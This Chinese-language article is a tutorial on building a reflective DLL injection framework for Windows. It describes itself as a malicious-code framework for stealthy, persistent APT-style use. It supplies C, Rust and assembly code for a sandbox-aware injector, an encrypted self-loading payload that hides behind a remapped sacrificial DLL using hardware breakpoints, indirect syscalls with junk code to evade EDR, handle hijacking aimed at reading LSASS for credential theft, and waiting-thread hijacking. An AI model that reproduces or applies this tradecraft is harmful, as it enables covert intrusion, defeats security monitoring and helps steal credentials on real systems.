# 反射DLL



反射DLL是一种高级的DLL加载技术，它通过模拟Windows加载器的工作流程，实现了从内存中直接加载DLL。通过使用Native API来达到隐蔽性的目的，并直接跳转到syscall来绕过常规的API监控。通过`sleaping`函数延迟映射恶意DLL来绕过EDR的内存扫描。可以用于APT和复杂的恶意软件中，在目标系统中长期驻留。

这项技术并非一个简单的“注入工具”，而是一个高级的、旨在实现深度隐蔽和持久化驻留的恶意代码框架。它的设计目标直指现代安全检测（如EDR、AV）的盲区。

## 实现思路

### 注入器(Stage 1)

注入器作为初始加载器，负责探测环境，查询进程信息，下载反射DLL。如有必要，可以创建互斥体来确保系统中只有一个实例运行。o

当注入器通过前期的情报收集确定当前运行的环境是正常的（比如没有调试器附加，没有运行在沙箱或虚拟机中），就会开始尝试向指定进程注入DLL。这个进程可以是一些不起眼的进程，最好该进程的操作特征与反射DLL中的恶意代码相匹配（如向外网发起连接请求，扫描文件，创建或关闭进程等）。

**查询目标进程的PID**

注入器会解析远程进程的程序文件名来找到目标进程的PID，通过拍摄一次当前系统中进程的快照，检索进程的PE文件名称是否与目标参数一致来找到目标进程的PID。

```c
    proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // retrieve information about the first process and exit if unsuccessful.
    Process32First(proc_snap, &pe32)

    // display information about all processes in the snapshot.
    do
    {
        to_tower_case_wide(pe32.szExeFile);
        if (wcscmp((pe32.szExeFile), proc_name) == 0)
        {
            CloseHandle(proc_snap);
            return pe32.th32ProcessID;
        }

    } while (Process32Next(proc_snap, &pe32));
```

在找到目标进程的PID之后，通过`OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)`获取目标进程的句柄，如果打开失败，则可能需要另寻其他目标，或者尝试提权。如果都以失败告终，则程序必须考虑结束自己。

**解析DLL**

在确定目标进程可以被注入之后，注入器会开始下载反射DLL并手动解析。其中最重要的一步是找到反射函数在DLL文件中的偏移，以及反射函数的大小。思路是这样的：解析DLL的导出表(EAT)，遍历整张表，找到反射函数的明文字符，获取函数地址，并使用`rva2raw`函数进行虚拟地址到文件偏移的转换，如果函数的第一条指令是跳转指令，还需要解析这条`jmp`指令得到偏移量，最终得到函数在文件中真正的起始地址。

PE 文件中的 `Exception Directory` 结构中存储了所有函数的其实地址和结束地址。遍历整个表，将`BeginAddress`与得到的`ReflectiveFunction` 的起始地址比较，得到`EndAddress`。函数的大小通过
$$
Size = EndAddress - BeginAddress
$$
得到。
```c
byte_t* DLLParser::find_func_end(byte_t* func_raw_ptr)
{

	PRUNTIME_FUNCTION p_runtime_func = (PRUNTIME_FUNCTION)(
		base + 
		rva2raw(optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress
			, pe_sections
			, (int)file_header.NumberOfSections));

	for (size_t i = 0; i < optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION); i++)
	{
		// Access the fields of each RUNTIME_FUNCTION structure
		if (p_runtime_func[i].BeginAddress == 0 && p_runtime_func[i].EndAddress == 0 && p_runtime_func[i].UnwindData == 0)
			continue;

		if ((byte_t*)rva2raw(p_runtime_func[i].BeginAddress, pe_sections, (int)file_header.NumberOfSections) == func_raw_ptr) {

			return (byte_t*)(rva2raw(p_runtime_func[i].EndAddress - 1, pe_sections, (int)file_header.NumberOfSections));
		}

	}

	return nullptr;
}
```


注入器会有一个预留的KEY用来加密反射函数。在得到反射函数的起始地址和函数的大小之后就会开始对反射函数进行加密。当这一切都准备妥当之后，注入器首先申请一段内存，大小为自定义头部的大小+反射DLL的大小。头部的数据包括`魔数，解密的KEY，反射函数的大小` 等。最后使用`WriteProcessMemory`向进程写入这些数据。

最后，注入器开始启动远程线程。它会先找到反射DLL中的预加载函数（方法与寻找反射函数一致），然后创建远程线程，并设置起始地址为这个预加载函数。`ResumeThread`函数执行之后，注入就完成了。



### 反射DLL (Stage 2)

**预加载函数**

预加载函数的编写与普通函数不同，该函数不能引用任何需要重定位的地址，即不能引用任何全局变量和API。`GetProcAddress` 和 `GetModuleHandle` 这些API必须手工实现，

预加载函数使用下面这种方式来获取当前DLL的内存地址。
```c
/*
	_123321_asdf21425 是预加载函数的函数名，这行代码对应的汇编指令如下：
	lea     rax, _123321_asdf21425
	其硬编码为 48 8D 05 A4 FE FF FF
	反汇编结果：
	0:  48 8d 05 a4 fe ff ff    lea    rax,[rip+0xfffffffffffffea4]
	
	使用当前RIP的值减去当前代码在函数起始处的偏移量，就得到了函数的起始地址。
 */
dll_base_addr = (ULONG_PTR)_123321_asdf21425;

while (TRUE)
{
	// DLL_HEADER结构就是存放在DLL文件起始处之前，由加载器构造填充
	dll_header = (PDLL_HEADER)dll_base_addr;
	if (dll_header->header == 0x44434241) {
		img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
		if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
		{
			img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));
			if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
				break;
		}
	}
	dll_base_addr--;
}

// 得到dll的地址
```

预加载器会使用`DLL_HEADER`中的`KEY`解密反射函数，然后手动执行反射函数，等函数返回之后再重新加密并清空`KEY`。如果分析者在反射函数执行完毕后拿到程序的内存，那么这位分析者就永远无法拿到函数的代码。这样做可以尽可能的减少反射函数以明文的方式暴漏在内存的时间。

```c
// decrypting the reflective function
pebase = ReflectiveFunction();
// re-encrypting the reflective function

dll_main = (fnDllMain)(pebase + img_opt_hdr->AddressOfEntryPoint);

HANDLE h_thread = func_CreateThread(
	NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
	(LPVOID)dll_main, 0, NULL
);
```

反射函数自加载它所处的反射DLL，然后返回一个DLL的基地址。接着预加载函数创建线程从DLL的入口开始执行。

**自加载函数**

反射函数通过对`ZwClose` ，`NtMapViewOfSection` 和 `NtCreateSection` 函数的入口打上硬件断点，并注册一个向量化异常处理例程，当触发单步异常时（如硬件断点），该异常处理例程就会被执行。异常处理例程通过调用这些API的`detour function` 对传入的参数进行修改。反射函数使用`LoadLibraryEx`加载牺牲的DLL(`SRH.dll`)，由于`LoadLibraryEx`会调用我们之前设置断点的几个API函数，所以当这些函数被`LoadLibraryEx`函数调用时，我们的异常处理例程就可以捕获这些单步异常，并调用对应的`detour function`去修改参数。`LoadLibraryEx`会对加载的DLL创建一个`Section`对象，并在最后通过`ZwClose`函数关闭这个对象。我们使用`ZwCloseDetour`函数来跳过该函数，保留该对象。当`LoadLibraryEx`函数执行完毕，我们移除该向量化异常处理例程，并取消这些硬件断点。

```c
fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR(hm_kernel32, str_AddVectoredExceptionHandler);
fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR(hm_kernel32, str_RemoveVectoredExceptionHandler);

if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
    return FALSE;
if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
    return FALSE;
if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
    return FALSE;

SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
retrieve_zw_func_s(GMHR(str_ntdll), zw_func_s);


/* set hardware breakpoint and detour functions */
func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

addr_ZwClose = GPAR(hm_ntdll, str_ZwClose);
addr_NtMapViewOfSection = GPAR(hm_ntdll, str_NtMapViewOfSection);
addr_NtCreateSection = GPAR(hm_ntdll, str_NtCreateSection);

if (addr_ZwClose != NULL
    && addr_NtCreateSection != NULL
    && addr_NtMapViewOfSection != NULL
    )
{
    set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
    set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
    set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
}

/*------------------------------LOADING SACRIFICAL DLL---------------------*/

PBYTE sac_dll_base = NULL;
CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };

HMODULE sac_dll_module_by_LoadLibrary = NULL;
sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

unset_hwbp(DrIndex::DR1);
unset_hwbp(DrIndex::DR2);
unset_hwbp(DrIndex::DR3);

func_RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

```

最后`find_SRH_DLL_section_handle`函数获得`SRH.dll`的`Section`对象的句柄。
```c
HANDLE sac_dll_handle = find_SRH_DLL_section_handle(zw_func_s, (fnGetProcessId)GPAR(hm_kernel32, str_GetProcessId));
```

反射函数也通过`RIP`寄存器获取当前模块的DLL头部，并使用`mem_to_free`变量记录该地址（由于我们之前通过`VirtualAllocEx`函数申请了这块内存，后续我们需要释放这块内存避免内存泄漏）。

反射函数创建一个新的`Section`对象，其大小稍大于`SRH.dll`的大小（因为我们需要额外记录某些信息）。紧接着，它会取消映射由`LoadLibraryEx`函数映射的`SRH.dll`的视图，记录该模块的基地址，并在该基地址处重新映射我们刚刚创建的`Section`对象的视图（用于反射DLL，我们简称mal_dll）。我们记录牺牲的DLL(SRH.dll)的Section句柄，刚刚创建的Section句柄，以及新创建的Section大小和mem_to_free，将这些信息放在基地址头部。紧接着拷贝反射DLL的信息到刚刚新建的Section中。

接下来，我们需要将注入器在远程进程中申请的用于存储反射DLL文件的内存空间拷贝到刚刚新创建的内存视图当中去，并且进行PE文件的加载（手动修复IAT，进行重定位，注册异常函数表等），最后一步，我们创建一个新的线程，用于执行CRT初始化，并跳到DllMain函数中。

反射DLL的内存驻留方案核心是通过**内存地址重用**技术，实现在同一内存地址无缝替换DLL，同时保持执行连续性。这是一种高级的进程内存操作技术。在`sleaping`函数中实现。

**sleaping**

```c
int sleaping(
    PVOID image_base,
    HANDLE sac_dll_handle,
    HANDLE mal_dll_handle,
    SIZE_T view_size,
    PNT_FUNCTIONS nt_func_s,
    PVOID NtTestAlert_addr
);
```

`image_base` 是当前模块的基地址，同时也是sac_dll的基地址（由LoadLibraryEx("SRH.dll", ... )函数加载确定。`sac_dll_handle` 是`SRH.dll`的Section句柄，而`mal_dll_handle` 是我们后续通过`NtCreateSection`函数新创建的Section句柄（对应于反射DLL本身）。我们需要保证当前进程中所有线程都没有引用`image_base -> image_base + view_size` 这块内存。我们的思路也很简单，将当前执行`sleaping`的线程挂起，并新创建几个线程进行`UnMapViewOfFile(image_base)`，并调用`MapViewOfFileEx(sac_dll -> image_base)` 进行重映射即可。下面展示了`sleaping`函数的时序分析结果：

```
Main thread
    │
    ├─ Initialization phase (0-several ms)
    │   ├─ Create event object
    │   ├─ Allocate CONTEXT memory
    │   └─ Create thread 2 (suspended state)
    │
    ├─ Configure thread 2
    │   ├─ Get thread context
    │   ├─ Modify to WaitForSingleObjectEx(NtTestAlert returns)
    │   └─ Resume thread 2 execution
    │
    ├─ Create other threads
    │   ├─ CreateThread0 (suspended): UnmapViewOfFile
    │   ├─ CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
    │   └─ CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
    │
    ├─ Configure thread context
    │   ├─ Thread 0: UnmapViewOfFile(image_base)
    │   ├─ Thread 1: MapViewOfFileEx(sac_dll→image_base)
    │   └─ Thread 3: MapViewOfFileEx(mal_dll→image_base)
    │
    ├─ Create timer queue
    │
    ├─ Set APC queue (thread 2)
    │   ├─ APC1: UnmapViewOfFile(image_base)
    │   ├─ APC2: ResumeThread (Thread 3)
    │   └─ APC3: ExitThread (thread 2 itself)
    │
    ├─ Set timer
    │   ├─ Timer 1 (200ms): ResumeThread (Thread 0)
    │   └─ Timer 2 (300ms): ResumeThread (Thread 1)
    │
    └─ Wait for all threads to complete
```




### 辅助函数实现参考

**GetModuleHandle实现**

`PPEBC	pPeb = (PEBC*)(__readgsqword(0x60))` 通过msvc编译器提供的函数来获取当前进程的PEB，找到`PEBC_LDR_DATA`的`Ldr`，遍历 `Ldr->InMemoryOrderModuleList`，这是一个由`LDR_DATA_TABLE_ENTRYC`结构构成的链表。`InInitializationOrderLinks.Flink`成员就是该模块的起始地址。

```c
PPEBC pPeb = (PEBC*)(__readgsqword(0x60));

PPEBC_LDR_DATA pLdr = (PPEBC_LDR_DATA)(pPeb->Ldr);
PLDR_DATA_TABLE_ENTRYC	pDte = (PLDR_DATA_TABLE_ENTRYC)(pLdr->InMemoryOrderModuleList.Flink);

while (pDte) 
{
	if (pDte->FullDllName.Length != NULL) 
	{
		ToLowerCaseWIDE(pDte->FullDllName.Buffer);
		ToLowerCaseWIDE(szModuleName);
		if (ComprareStringWIDE(pDte->FullDllName.Buffer, szModuleName))
			return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
	}
	else 
		break;

	pDte = *(PLDR_DATA_TABLE_ENTRYC*)(pDte);
}
```


**GetProcAddress实现**

`hModule`参数就是指向模块在内存中的起始地址，反射DLL需要做的就是解析这个PE文件，找到导出表，接着遍历导出表中的函数名字数组，找到匹配的函数并得到函数的RVA。如果函数的RVA落在导出表内部，说明该“函数”实际上是一个**转发器字符串**（例如 `"NTDLL.RtlAllocateHeap"`），而不是真正的可执行代码地址。此时就需要使用`GetProcessAddress(LoadLibrary(dll), function)`得到真正的函数地址。

```c

/* 使用函数名获取地址的主要逻辑 */
for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) 
{
	CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

	if (CompareStringASCII(lpApiName, pFunctionName)) 
	{
		functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		if (functionAddress >= (PBYTE)pImgExportDir && functionAddress < (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) 
		/*
			处理转发函数
			如果函数的RVA落在导出表内部，则functionAddress则指向字符串，此时需要解析
			这个字符串得到DLL名和函数名。并通过LoadLibrary来得到真正的函数地址。
		 */
		{
			ParseForwarder((CHAR*)functionAddress, dll, function);
			if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)
				return NULL;
			if (function[0] == '#') 
				return GPARO(LLA(dll), custom_stoi(function));
			else 
				return GPAR(LLA(dll), function);
		}
		else 
			return (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
	}
}

/* 使用序号来获取函数地址 */
functionAddress = (PBYTE)(pBase + FunctionAddressArray[ordinal]);
if (functionAddress >= (PBYTE)pImgExportDir && functionAddress < (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) 
{
	ParseForwarder((CHAR*)functionAddress, dll, function);
	if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)
		return NULL;
	if (function[0] == '#')
		return GPARO(LLA(dll), custom_stoi(function));
	else
		return GPAR(LLA(dll), function);
}
return (FARPROC)(pBase + FunctionAddressArray[ordinal]);
```

## 免杀扩展

如果只是完全按照上面的描述去实现注入器，大概率会被杀毒软件或EDR拦截。下面介绍一些更难以检测的注入方式。

> **Note**
>
> 没有任何一种单独的技术可以做到完全规避所有的检测，在实践中需要组合搭配多种技术。甚至是调查目标的系统环境，针对性的开发。

### 间接syscall(Indirect Syscall)

如果我们只是简单的调用`CreateRemoteThread`来注入，那么肯定会被安全软件拦截，安全软件普遍都会在核心的`API`做Hook。

**间接syscall**不直接调用这些API，而是通过构造好参数，然后跳转到对应的 NTAPI 中的`syscall` 指令去执行。

```rust
// ═══════════════════════════════════════════════════
// NtCreateThreadEx (ZwCreateThreadEx)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_create_thread_ex(
    thread_handle:      *mut HANDLE,
    desired_access:     u32,
    object_attributes:  *mut OBJECT_ATTRIBUTES,
    process_handle:     HANDLE,
    start_routine:      *mut c_void,
    argument:           *mut c_void,
    create_flags:       u64,
    zero_bits:          usize,
    stack_size:         usize,
    max_stack_size:     usize,
    attribute_list:     *mut c_void,
    ssn:                u32,
    syscall_ret:        *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 96]",
        "jmp qword ptr [rsp + 104]"
    )
}
```

使用这个函数时，我们仅仅需要多传入两个参数，该API对应的ssn和syscall指令的地址，其他部分与调用`NtCreateThreadEx`函数一样。

为了防止规则匹配或者静态模式匹配，我们还可以为这些函数添加花指令(junk code)。

```assembly
ZwSetContextThread PROC
	mov r10, rcx
	mov r11, rax
	shl r11, 11h
	shr r11, 11h
	xor rcx, r11
	mov rax, rcx
	sub rax, rcx
	movd xmm4, eax
	paddd xmm4, xmm5
	psubd xmm4, xmm5
	pxor xmm4, xmm5
	mov eax, r8d
	jmp r9
ZwSetContextThread ENDP
```





### 句柄劫持(Handle Hijacking)

当程序调用 `OpenProcess`（底层为 `NtOpenProcess`）试图获取另一个进程的句柄时，现代 EDR 通常通过以下两种方式进行拦截或告警：

- **用户层 Hook (Ring 3)：** 在 `ntdll.dll` 中 Hook `NtOpenProcess`。
- **内核层回调 (Ring 0)：** 使用微软提供的 `ObRegisterCallbacks` 注册对象回调。当有进程尝试请求受保护进程的 `PROCESS_ALL_ACCESS` 或 `PROCESS_VM_READ` 等高危权限时，EDR 会在内核层面直接降权或拒绝访问。比如当你想要读取某敏感进程的内存，你可能会使用`NtOpenProcess`函数搭配`PROCESS_VM_READ`。EDR的内核驱动会直接把这个请求的标志位清除。

我们可以转用**句柄劫持(Handle Hijacking)**的技术来绕过这一检测。

首先使用Windows提供的API来进行系统环境信息收集。调用未文档化的 API `NtQuerySystemInformation`，并传入参数 `SystemHandleInformation` (0x10) 或 `SystemExtendedHandleInformation` (0x40)。这个 API 会返回当前操作系统中**所有**打开的句柄列表。返回的数据包含每个句柄的宿主进程 PID（谁拥有这个句柄）、句柄的值、句柄的类型（是文件、注册表还是进程/线程），以及该句柄拥有的访问权限（GrantedAccess）。

遍历这个庞大的系统句柄列表，寻找满足以下条件的句柄：

- **类型匹配：** 句柄类型必须是“进程”（Process）。
- **权限满足：** 句柄的权限（GrantedAccess）必须满足自己的需求，例如包含 `PROCESS_VM_READ`（用于读取内存，如 Dump LSASS）或 `PROCESS_VM_WRITE | PROCESS_VM_OPERATION`（用于注入代码）。
- **目标匹配：** 通过一些手段（如 `NtQueryInformationProcess`）确认这个句柄指向的到底是不是它想攻击的目标进程（比如 `lsass.exe`）。

如果我们发现某个进程（通常是系统进程）持有一个指向目标进程的高权限句柄。此时，我们只需要调用`OpenProcess` 打开这个系统进程，请求权限为`PROCESS_DUP_HANDLE`。

EDR对普通的 `svchost.exe` 申请 `PROCESS_DUP_HANDLE` 权限的监控可能相对宽松，因为系统进程之间互相复制句柄是操作系统的正常行为。

一旦成功获取了宿主进程的句柄，调用 `DuplicateHandle`（底层为 `NtDuplicateObject`）。接下来就可以使用这个偷来的句柄调用 `ReadProcessMemory`、`WriteProcessMemory` 或 `CreateRemoteThread`，从而完成凭证窃取或代码注入。

### 等待线程劫持(Waiting Thread Hijacking)

当一个进程尝试通过 `CreateRemoteThread` 或 `NtCreateThreadEx` 在另一个进程（如 `explorer.exe`）中创建新线程时，EDR 的内核回调或用户层 Hook 会立刻捕获这一行为。

目标进程中通常有很多线程，有的在执行计算，有的在渲染 UI。当线程处于等待状态（例如调用了 `Sleep`、`WaitForSingleObject`、等待 I/O 操作完成）的线程，其 CPU 寄存器状态是稳定且可预测的，劫持它们并恢复现场的成功率最高。

**上下文修改**

如果你只想找一个已知 PID 的进程中等待线程，可考虑使用更稳定的公开 API，如 `CreateToolhelp32Snapshot` + `Thread32First/Next` 获取线程ID，再结合 `WaitForSingleObject` 等检查，但这需要进程句柄且效率较低。

调用未文档化的 API `NtQuerySystemInformation`，并传入参数`SystemProcessInformation` (0x05)。

使用 `SystemProcessInformation` 会返回一个巨大的内存块，里面包含所有进程的信息。每个进程信息后面，紧跟着属于该进程的所有线程信息。我们需要定义两个未文档化的结构体：

```c++
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemProcessInformation = 5
} SYSTEM_INFORMATION_CLASS;

typedef LONG KPRIORITY; // 来自 winternl.h

typedef enum _KTHREAD_STATE {
    StateInitialized,
    StateReady,
    StateRunning,
    StateStandby,
    StateTerminated,
    StateWaiting,           // 目标状态
    StateTransition,
    StateDeferredReady,
    StateGateWaitObsolete,
    StateMaximum
} KTHREAD_STATE;

// 与 phnt 定义对齐（适用于 Windows 7+）
typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG         WaitTime;
    PVOID         StartAddress;
    CLIENT_ID     ClientId;          // 包含 UniqueProcess 和 UniqueThread
    KPRIORITY     Priority;
    KPRIORITY     BasePriority;
    ULONG         ContextSwitches;
    KTHREAD_STATE ThreadState;       // 线程状态
    ULONG         WaitReason;        // 等待原因 (KWAIT_REASON)
} SYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize; // VISTA+
    ULONG         HardFaultCount;        // WIN7+
    ULONG         NumberOfThreadsHighWatermark; // WIN7+
    ULONGLONG     CycleTime;             // WIN7+
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY     BasePriority;
    HANDLE        UniqueProcessId;
    HANDLE        InheritedFromUniqueProcessId;
    ULONG         HandleCount;
    ULONG         SessionId;
    ULONG_PTR     UniqueProcessKey;      // VISTA+
    SIZE_T        PeakVirtualSize;
    SIZE_T        VirtualSize;
    ULONG         PageFaultCount;
    SIZE_T        PeakWorkingSetSize;
    SIZE_T        WorkingSetSize;
    SIZE_T        QuotaPeakPagedPoolUsage;
    SIZE_T        QuotaPagedPoolUsage;
    SIZE_T        QuotaPeakNonPagedPoolUsage;
    SIZE_T        QuotaNonPagedPoolUsage;
    SIZE_T        PagefileUsage;
    SIZE_T        PeakPagefileUsage;
    SIZE_T        PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    // 后面紧跟着 SYSTEM_THREAD_INFORMATION 数组，无需在此定义占位
} SYSTEM_PROCESS_INFORMATION;

// 函数指针类型
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Inout_   PVOID                    SystemInformation,
    _In_      ULONG                    SystemInformationLength,
    _Out_opt_ PULONG                   ReturnLength
);
```

如果是进行 **APC 注入**，不仅要求线程处于 Wait 状态，还需要线程处于 `Alertable`（可警告）状态。通常，攻击者会进一步检查 `WaitReason`。例如，`WaitReason` 为 `DelayExecution` (通常是调用 `Sleep` 引起的) 或者是 `UserRequest` (等待用户输入) 的线程，被唤醒或接受 APC 的概率更高。

一旦找到 `ThreadState == 5` 的线程，通过 `Threads[i].ClientId.UniqueThread` 就能拿到该线程的 TID（Thread ID）。接下来，攻击者就可以拿着这个 TID 去调用 `OpenThread` 进行挂起和上下文修改了。
